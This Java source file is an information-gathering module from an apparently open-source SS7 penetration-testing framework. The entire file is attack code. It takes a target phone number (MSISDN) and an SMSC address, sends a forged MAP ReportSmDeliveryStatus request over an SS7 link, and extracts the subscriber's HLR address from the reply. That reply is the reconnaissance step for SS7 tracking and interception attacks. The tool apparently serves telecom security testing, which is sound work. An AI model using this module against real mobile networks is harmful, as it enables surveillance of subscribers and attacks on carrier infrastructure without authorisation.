/*
 * Etisalat Egypt, Open Source
 * Copyright 2021, Etisalat Egypt and individual contributors
 * by the @authors tag.
 *
 * This program is free software: you can redistribute it and/or modify
 * under the terms of the GNU Affero General Public License as
 * published by the Free Software Foundation; either version 3 of
 * the License, or (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU Affero General Public License for more details.
 *
 * You should have received a copy of the GNU Affero General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>
 */

/**
 * @author Ayman ElSherif
 */

package com.rodan.intruder.ss7.usecases.attacks.infogathering;

import com.rodan.intruder.ss7.entities.event.model.sms.ReportSmDeliveryStatusResponse;
import com.rodan.intruder.ss7.entities.event.service.MapSmsServiceListener;
import com.rodan.intruder.ss7.entities.payload.sms.ReportSmDeliveryStatusPayload;
import com.rodan.intruder.ss7.usecases.Ss7ModuleTemplate;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleConstants;
import com.rodan.intruder.ss7.usecases.model.Ss7ModuleOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.HlrAddressSmOptions;
import com.rodan.intruder.ss7.usecases.model.infogathering.HlrAddressSmResponse;
import com.rodan.intruder.ss7.usecases.port.Ss7Gateway;
import com.rodan.library.model.Constants;
import com.rodan.library.model.annotation.Module;
import com.rodan.library.model.error.SystemException;
import com.rodan.intruder.kernel.usecases.SignalingModule;
import lombok.Builder;
import org.apache.log4j.LogManager;
import org.apache.log4j.Logger;

@Module(name = Ss7ModuleConstants.HLR_ADDRESS_SM_NAME, category = Ss7ModuleConstants.INFO_GATHERING_CATEGORY_DISPLAY_NAME,
        displayName = Ss7ModuleConstants.HLR_ADDRESS_SM_DISPLAY_NAME, brief = Ss7ModuleConstants.HLR_ADDRESS_SM_BRIEF,
        description = Ss7ModuleConstants.HLR_ADDRESS_SM_DESCRIPTION, rank = Ss7ModuleConstants.HLR_ADDRESS_SM_RANK,
        mainPayload = Constants.REPORT_SM_DELIVERY_STATUS_PAYLOAD_NAME)
public class HlrAddressSmModule extends Ss7ModuleTemplate implements SignalingModule, MapSmsServiceListener {
    final static Logger logger = LogManager.getLogger(HlrAddressSmModule.class);

    @Builder
    public HlrAddressSmModule(Ss7Gateway gateway, Ss7ModuleOptions moduleOptions) {
        super(gateway, moduleOptions);
    }

    @Override
    protected void generatePayload() {
        logger.debug("Generating payload");
        logger.debug("Module Options: " + moduleOptions);
        var options = (HlrAddressSmOptions) moduleOptions;
        var payload = ReportSmDeliveryStatusPayload.builder()
                .localGt(options.getNodeConfig().getSs7Association().getLocalNode().getGlobalTitle())
                .msisdn(options.getMsisdn()).smscGt(options.getSmscGt()).mapVersion(options.getMapVersion())
                .build();
        setMainPayload(payload);
        setCurrentPayload(getMainPayload());
        logger.debug("Payload: " + payload);
        logger.debug("Payload: " + payload);
    }

    @Override
    protected void addServiceListener() throws SystemException {
        logger.debug("Adding service listeners");
        super.addServiceListener();
        var localSsn = getMainPayload().getLocalSsn();
        getGateway().addSmsServiceListener(localSsn, this);
    }

    @Override
    protected void cleanup() throws SystemException {
        super.cleanup();
        if (getGateway() != null && getMainPayload() != null) {
            var localSsn = getMainPayload().getLocalSsn();
            getGateway().removeSmsServiceListener(localSsn, this);
        }
    }

    @Override
    public void onReportSMDeliveryStatusResponse(ReportSmDeliveryStatusResponse response) {
        logger.debug("##### Received REPORT_SM_DELIVERY_STATUS response!");
        logger.debug(response);
        logger.debug("Parsing response.");

        moduleResponse = HlrAddressSmResponse.builder()
                .hltGt(response.getHlrGt())
                .build();
        setResultReceived(true);
    }
}
